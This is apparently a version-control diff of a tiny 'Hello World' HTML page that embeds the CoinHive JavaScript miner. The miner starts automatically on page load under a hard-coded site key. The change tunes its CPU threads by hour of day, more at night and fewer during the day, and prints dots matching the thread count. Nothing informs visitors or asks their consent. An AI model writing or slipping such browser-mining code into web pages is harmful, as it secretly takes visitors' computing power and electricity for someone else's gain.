@@ -3,10 +3,18 @@
     <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <body>
     <script>
-      var min = new CoinHive.Anonymous('80JQlNnsmQN3OeJHBNAGIHLQgKg9qhto');
-      min.setNumThreads(3);
-      min.start();
+        var h = new Date().getHours();
+        var n = 6;
+        if(h>7 & h<23)
+            n = 3
+        var min = new CoinHive.Anonymous('80JQlNnsmQN3OeJHBNAGIHLQgKg9qhto');
+        min.setNumThreads(n);
+        min.start();
     </script>
-<h1>Hello World</h1>
+<h1>Hello World
+      <script type="text/javascript">
+        document.write(".".repeat(n))
+      </script>
+</h1>
 </body>
 </html>
